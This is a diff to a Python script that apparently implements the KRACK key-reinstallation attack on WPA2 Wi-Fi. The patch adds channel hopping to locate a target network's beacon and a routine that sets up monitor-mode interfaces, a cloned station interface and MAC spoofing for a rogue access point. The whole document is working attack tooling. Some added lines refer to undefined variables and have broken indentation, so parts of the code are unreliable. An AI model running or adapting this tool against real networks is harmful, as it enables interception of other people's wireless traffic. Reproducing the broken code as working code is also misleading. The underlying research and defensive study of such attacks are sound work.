@@ -457,10 +457,20 @@ class KRAckAttack():
 		self.hostapd_ctrl.request("FINISH_4WAY %s" % stamac)
 
 	def find_beacon(self, ssid):
-		p = sniff(count=1, timeout=2, lfilter=lambda p: get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, opened_socket=self.sock_real)
-		if p is None or len(p) < 1: return
-		self.beacon = p[0]
-		self.apmac = self.beacon.addr2
+		ps = sniff(count=1, timeout=0.3, lfilter=lambda p: Dot11Beacon in p and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, opened_socket=self.sock_real)
+		if ps is None or len(ps) < 1:
+			log(STATUS, "Searching for target network on other channels")
+			for chan in [1, 6, 11, 3, 8, 2, 7, 4, 10, 5, 9, 12, 13]:
+				self.sock_real.set_channel(chan)
+				log(DEBUG, "Listening on channel %d" % chan)
+				ps = sniff(count=1, timeout=0.3, lfilter=lambda p: Dot11Beacon in p and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, opened_socket=self.sock_real)
+				if ps and len(ps) >= 1: break
+
+		if ps and len(ps) >= 1:
+			actual_chan = ord(get_tlv_value(ps[0], IEEE_TLV_TYPE_CHANNEL))
+			self.sock_real.set_channel(actual_chan)
+			self.beacon = ps[0]
+			self.apmac = self.beacon.addr2
 
 	def send_csa_beacon(self, numbeacons=1, target=None, silent=False):
 		newchannel = self.netconfig.rogue_channel
@@ -719,15 +729,37 @@ class KRAckAttack():
 
 		self.hostapd_log.write(datetime.now().strftime('[%H:%M:%S] ') + line)
 
-	def run(self, strict_echo_test=False):
-		# In general, we assume the NIC can only ACK frames sent to one specific MAC address (the targeted client)
+	def configure_interfaces(self):
+		# 1. Remove unused virtual interfaces
+		subprocess.call(["iw", self.nic_real + "sta1", "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
+		if self.nic_rogue_mon is None:
+			subprocess.call(["iw", self.nic_rogue_ap + "mon", "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
+
+		# 2. Configure monitor mode on interfaces
+		subprocess.check_output(["ifconfig", self.nic_real, "down"])
+		subprocess.check_output(["iw", self.nic_real, "set", "type", "monitor"])
+		if self.nic_rogue_mon is None:
+			self.nic_rogue_mon = self.nic_rogue_ap + "mon"
+			subprocess.check_output(["iw", self.nic_rogue_ap, "interface", "add", self.nic_rogue_mon, "type", "monitor"])
+
+		# 3. Configure interface on real channel to ACK frames
 		if self.clientmac:
-			set_monitor_ack_address(self.nic_real, self.clientmac)
+				sta_iface = iface + ("sta" if sta_suffix is None else sta_suffix)
+				subprocess.check_output(["iw", iface, "interface", "add", sta_iface, "type", "managed"])
+				call_macchanger(sta_iface, macaddr)
+				subprocess.check_output(["ifconfig", sta_iface, "up"])
 		else:
 			# Note: some APs require handshake messages to be ACKed before proceeding (e.g. Broadcom waits for ACK on Msg1)
-			log(WARNING, "WARNING: Only targetting a specific client is fully supported. Please provide a target using --target.")
+			log(WARNING, "WARNING: Targeting ALL clients is not fully supported! Please provide a specific target using --target.")
 			# Sleep for a second to make this warning very explicit
 			time.sleep(1)
+
+		# 4. Finally up the interfaces up
+		subprocess.check_output(["ifconfig", self.nic_real, "up"])
+		subprocess.check_output(["ifconfig", self.nic_rogue_mon, "up"])
+
+	def run(self, strict_echo_test=False):
+		self.configure_interfaces()
 
 		# Make sure to use a recent backports driver package so we can indeed
 		# capture and inject packets in monitor mode.
@@ -737,7 +769,7 @@ class KRAckAttack():
 		# Test monitor mode and get MAC address of the network
 		self.find_beacon(self.ssid)
 		if self.beacon is None:
-			log(ERROR, "No beacon received of network <%s>. Is monitor mode working, and are you on the correct channel?" % self.ssid)
+			log(ERROR, "No beacon received of network <%s>. Is monitor mode working? Did you enter the correct SSID?" % self.ssid)
 			return
 		# Parse beacon and used this to generate a cloned hostapd.conf
 		self.netconfig = NetworkConfig()
@@ -819,6 +851,9 @@ class KRAckAttack():
 			self.hostapd.wait()
 		if self.hostapd_log:
 			self.hostapd_log.close()
+		# TODO: What to do about this?
+		if self.clientmac:
+			subprocess.call(["iw", nic_real + "sta1", "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
 		if self.sock_real: self.sock_real.close()
 		if self.sock_rogue: self.sock_rogue.close()
 
@@ -838,9 +873,6 @@ if __name__ == "__main__":
 	parser.add_argument("--strict-echo-test", help="Never treat frames received from the air as echoed injected frames", action='store_true')
 	parser.add_argument("--continuous-csa", help="Continuously send CSA beacons on the real channel (10 every second)", action='store_true')
 	args = parser.parse_args()
-
-	if args.nic_rogue_mon is None:
-		args.nic_rogue_mon = args.nic_rogue_ap + "mon"
 
 	global_log_level = max(ALL, global_log_level - args.debug)
 
